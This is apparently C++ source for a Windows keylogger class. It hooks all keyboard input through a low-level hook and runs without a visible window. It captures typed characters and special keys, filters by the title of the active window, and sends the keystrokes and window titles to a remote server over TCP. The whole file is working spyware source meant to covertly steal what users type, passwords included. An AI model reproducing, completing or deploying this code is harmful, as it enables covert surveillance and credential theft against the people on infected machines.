#include "Keylogger.h"

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:wmainCRTStartup")

const std::vector<BYTE> Keylogger::valueKeys = {
	0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, // Digits 0 - 9
	0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, //Letters A - Z
	VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6, VK_NUMPAD7, VK_NUMPAD8, VK_NUMPAD9, //Numpad digits 0 - 9
	VK_MULTIPLY, VK_ADD, VK_SEPARATOR, VK_SUBTRACT, VK_DECIMAL, VK_DIVIDE, VK_OEM_1, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5,
	VK_OEM_6, VK_OEM_7, VK_OEM_8, VK_OEM_102, VK_SPACE, VK_OEM_PLUS, VK_OEM_MINUS, VK_OEM_PERIOD, VK_OEM_COMMA //Other
};

const std::vector<BYTE> Keylogger::specialKeys = {
	VK_LBUTTON, VK_RBUTTON, VK_MBUTTON, VK_BACK, VK_TAB, VK_RETURN, VK_CONTROL, VK_MENU, VK_ESCAPE, VK_PRIOR, VK_NEXT, VK_END,
	VK_HOME, VK_LEFT, VK_RIGHT, VK_UP, VK_DOWN, VK_INSERT, VK_DELETE //Special keys
};

const std::vector<std::wstring> Keylogger::specialKeyNames = {
	L"[LMB]", L"[RMB]", L"[MMB]", L"[BS]", L"[TAB]", L"[ENTER]", L"[CTRL]", L"[ALT]", L"[ESC]", L"[PGUP]", L"[PGDWN]", L"[END]", L"[HOME]", L"[LARROW]", L"[RARROW]",
	L"[UARROW]", L"[DARROW]", L"[INS]", L"[DEL]"
};

const std::vector<std::vector<BYTE>> Keylogger::keySets = { valueKeys, specialKeys };

BYTE Keylogger::keyState[256] = { 0 };

Filters* Keylogger::filters;
TcpClient* Keylogger::client;
HHOOK Keylogger::hHook;
std::wstring Keylogger::previousWindowTitle;

Keylogger::Keylogger(TcpClient *client, Filters *filters)
{
	this->client = client;
	this->filters = filters;
}

Keylogger::~Keylogger()
{
	delete(filters);
	client->Disconnect();
	delete(client);
}

BOOLEAN Keylogger::SetHook()
{
	HHOOK res = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
	if (res != NULL)
	{
		Keylogger::hHook = res;
	}
	else
		return FALSE;

	keyState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) != 0 ? 0xff : 0x00;
	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
	UnhookWindowsHookEx(hHook);
	return TRUE;
}

LRESULT CALLBACK Keylogger::KeyboardProc(IN int nCode, IN WPARAM wParam, IN LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYUP || wParam == WM_SYSKEYUP))
	{
		KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;
		if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
			keyState[VK_SHIFT] = 0x00;
	}

	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;

		if (key->vkCode == VK_LSHIFT || key->vkCode == VK_RSHIFT)
			keyState[VK_SHIFT] = 0xff;
		if (key->vkCode == VK_CAPITAL)
			keyState[VK_CAPITAL] ^= 0xff;

		
		int keyGroup;
		int keyPos;
		bool isTracedKey = false;
		for(UINT i = 0; i < keySets.size(); i++)
			for (UINT j = 0; j < keySets[i].size(); j++)
			{
				if (keySets[i][j] == key->vkCode)
				{
					keyGroup = i;
					keyPos = j;
					isTracedKey = true;
					break;
				}
			}

		if (isTracedKey)
		{
			HWND hWindow = GetForegroundWindow();
			HKL hLang = GetKeyboardLayout(GetWindowThreadProcessId(hWindow, NULL));

			wchar_t titleBuff[256];
			GetWindowTextW(hWindow, titleBuff, 256);
			std::wstring title(titleBuff);
			bool isWorthy = false;

			if (previousWindowTitle != title)
			{
				if (filters->Match(title))
				{
					isWorthy = true;
					previousWindowTitle = title;
					std::wstring msg = L"\n\n[" + title + L"]\n\t";
					client->SendBuff(msg);
				}
				else isWorthy = false;
			}
			else if (title != L"")
				isWorthy = true;

			if(isWorthy)
				switch (keyGroup)
				{
				case 1:
					client->SendBuff(specialKeyNames[keyPos]);
					break;

				case 0:
					wchar_t wcharBuff[2];
					ToUnicodeEx(key->vkCode, 0, keyState, wcharBuff, 2, 0, hLang);
					client->SendBuff(wcharBuff[0]);
					break;
				}
		}

	}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

